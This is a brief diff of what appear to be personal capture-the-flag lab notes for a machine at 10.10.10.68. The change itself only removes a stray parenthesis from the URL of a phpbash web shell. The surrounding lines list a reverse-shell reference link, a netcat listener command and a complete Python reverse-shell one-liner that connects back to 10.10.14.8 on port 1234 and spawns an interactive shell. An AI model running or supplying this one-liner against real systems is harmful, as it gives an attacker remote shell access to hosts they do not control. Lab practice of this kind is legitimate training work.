@@ -1,5 +1,5 @@
 ```
-(http://10.10.10.68/dev/phpbash.php
+http://10.10.10.68/dev/phpbash.php
 https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
 nc -nlvp 1234
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
